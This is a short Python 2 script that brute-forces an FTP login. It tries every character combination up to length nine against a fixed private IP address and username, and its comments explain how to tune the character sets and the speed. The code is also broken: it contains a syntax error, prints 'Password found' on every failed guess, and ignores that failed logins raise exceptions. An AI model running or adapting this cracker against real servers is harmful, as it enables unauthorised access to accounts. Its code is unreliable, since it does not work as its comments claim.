import itertools
from itertools import product
import string
import re
import time
from ftplib import FTP
host = '10.25.2.32'
username = 'test'
ftpcon = FTP(host)
# Set password complexity - remove string character sets not required
chars = string.lowercase + string.uppercase + string.digits + string.punctuation
# Set max password length to crack - change 10 to desired length 
for x in range(10):
	for guess in itertools.product((chars), repeat=x):
		i = ''.join(guess)
		test = ftpcon.login(username, i)
		if test = '230 Logged on':
		#uncomment below to debug attempted passwords
			print "\n\nPassword found - " + i
			break
		else:
			print "\n\nPassword found - " + i
			print i + " - is not\ the password"
			#uncomment below to throttle down script speed - change sleep timer as needed
			#time.sleep(0.1)
			continue